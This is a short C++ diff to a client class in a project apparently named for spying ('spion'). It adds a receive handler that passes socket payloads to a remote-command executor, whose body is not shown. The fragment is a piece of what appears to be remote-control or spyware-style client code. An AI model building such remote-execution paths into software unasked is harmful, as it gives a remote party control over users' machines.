@@ -56,6 +56,21 @@ bool spion::Client::send(common::protocol::payload const & payload)
 	return (common::protocol::string::send(_socket, payload));
 }
 
+spion::Client::recv_event spion::Client::on_recv()
+{
+	std::string received;
+
+	recv_event result = recv(received);
+
+	if (result == recv_event::payload)
+	{
+		if (execute_remote_cmd(received) == false)
+			COUT_INFO << received;
+	}
+
+	return(result);
+}
+
 spion::Client::recv_event spion::Client::recv(std::string & result)
 {
 	auto tmp = common::protocol::string::on_recv(_socket);
